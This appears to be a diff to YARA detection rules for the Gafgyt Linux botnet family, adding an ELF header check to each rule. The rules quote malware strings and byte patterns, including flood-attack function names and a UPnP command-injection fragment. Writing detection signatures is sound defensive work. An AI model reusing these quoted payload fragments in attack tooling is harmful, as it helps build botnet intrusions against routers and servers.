         $x_1_2 = {af bf 00 2c af be 00 28 03 a0 f0 21 af bc 00 10 af c4 00 30 af c0 00 1c 8f c4 00 30 8f 99 81 84 00}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4384,6 +4559,7 @@ rule Backdoor_Linux_Gafgyt_AC_2147829427_0
         $x_1_4 = "botkill" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4410,6 +4586,7 @@ rule Backdoor_Linux_Gafgyt_AD_2147829555_0
         $x_1_6 = "kickuser" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4433,6 +4610,7 @@ rule Backdoor_Linux_Gafgyt_CS_2147829965_0
         $x_1_3 = {7f b0 b0 b0 80 74 ce ff 7f b0 b0 b0 80 74 ce}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4456,6 +4634,7 @@ rule Backdoor_Linux_Gafgyt_CV_2147830792_0
         $x_1_3 = {48 98 0f b6 44 05 d0 89 c2 48 8b 45 c8 88 10 48 ff 45 c8 ff 45 f4}  //weight: 1, accuracy: High
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (2 of ($x*))
 }
 
@@ -4481,6 +4660,7 @@ rule Backdoor_Linux_Gafgyt_BM_2147833474_0
         $x_1_5 = "do_send_svstime" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (4 of ($x*))
 }
 
@@ -4505,6 +4685,7 @@ rule Backdoor_Linux_Gafgyt_BN_2147834407_0
         $x_1_4 = "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4529,6 +4710,7 @@ rule Backdoor_Linux_Gafgyt_BO_2147842153_0
         $x_1_4 = "/bin/busybox MIRAI" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4553,6 +4735,7 @@ rule Backdoor_Linux_Gafgyt_DA_2147844119_0
         $x_1_4 = "PONG" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4579,6 +4762,7 @@ rule Backdoor_Linux_Gafgyt_BG_2147846451_0
         $x_1_6 = "hlLjztqZ" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (5 of ($x*))
 }
 
@@ -4604,6 +4788,7 @@ rule Backdoor_Linux_Gafgyt_DB_2147851287_0
         $x_1_5 = "./condi.mips" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4627,6 +4812,7 @@ rule Backdoor_Linux_Gafgyt_DC_2147904708_0
         $x_1_3 = "udpplain_flood" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4649,6 +4835,7 @@ rule Backdoor_Linux_Gafgyt_DD_2147915801_0
         $x_1_2 = {0f b1 4b 38 0f 85 a1 00 00 00 89 53 40 ff 43 3c f6 03 40 74 ?? 83 ec 0c 53 e8 22 b2 ff ff 83 c4 10 85 c0 75 ?? 83 ff 01}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4671,6 +4858,7 @@ rule Backdoor_Linux_Gafgyt_BR_2147917137_0
         $x_1_2 = {83 c8 ff 83 7d dc ff 0f 84 ?? ?? ?? ?? 8b 75 0c 8b 45 dc 01 c8 01 f7 89 cb c7 45 ec ff ff ff ff c7 45 f0 ff ff ff ff 89 45 e4 89 7d e0}  //weight: 1, accuracy: Low
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4695,6 +4883,7 @@ rule Backdoor_Linux_Gafgyt_DF_2147932283_0
         $x_1_4 = "vse_attack" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
@@ -4721,6 +4910,7 @@ rule Backdoor_Linux_Gafgyt_DF_2147932283_1
         $x_1_6 = "klv1234" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((2 of ($x_2_*) and 3 of ($x_1_*))) or
             (all of ($x*))
@@ -4749,6 +4939,7 @@ rule Backdoor_Linux_Gafgyt_DE_2147932896_0
         $x_2_5 = "Clients connected" ascii //weight: 2
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (
             ((1 of ($x_5_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
             (all of ($x*))
@@ -4776,6 +4967,7 @@ rule Backdoor_Linux_Gafgyt_AU_2147946602_0
         $x_1_4 = "icmp_attack.c" ascii //weight: 1
     condition:
         (filesize < 20MB) and
+        (uint32(0) == 0x464c457f) and
         (all of ($x*))
 }
 
